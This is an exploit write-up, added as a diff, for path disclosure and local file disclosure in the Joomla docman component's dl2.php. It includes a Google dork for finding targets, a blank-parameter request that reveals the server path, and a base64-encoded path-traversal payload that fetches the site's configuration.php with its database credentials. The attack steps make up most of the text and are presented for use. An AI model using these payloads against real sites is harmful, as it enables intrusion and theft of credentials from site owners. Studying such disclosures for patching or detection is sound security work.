@@ -1,0 +1,30 @@
+# Joomla docman Component 'com_docman' Full Path Disclosure(FPD) & Local File Disclosure/Include(LFD/LFI)
+# CWE: CWE-200(FPD) CWE-98(LFI/LFD)
+# Risk: High
+# Author: Hugo Santiago dos Santos
+# Contact: hugo.s@linuxmail.org
+# Date: 13/07/2015
+# Vendor Homepage: http://extensions.joomla.org/extension/directory-a-documentation/downloads/docman
+# Google Dork: inurl:"/components/com_docman/dl2.php"
+
+# Xploit (FPD): 
+ 
+ Get one target and just download with blank parameter: 
+ http://www.site.com/components/com_docman/dl2.php?archive=0&file=
+ 
+ In title will occur Full Path Disclosure of server.
+ 
+# Xploit (LFD/LFI):
+
+ http://www.site.com/components/com_docman/dl2.php?archive=0&file=[LDF]
+ 
+ Let's Xploit...
+ 
+ First we need use Xploit FPD to see the path of target, after that we'll Insert 'configuration.php' configuration database file and encode in Base64:
+ 
+ ../../../../../../../target/www/configuration.php <= Not Ready
+ 
+ http://www.site.com/components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==  <= Ready !
+ 
+
+And Now we have a configuration file...
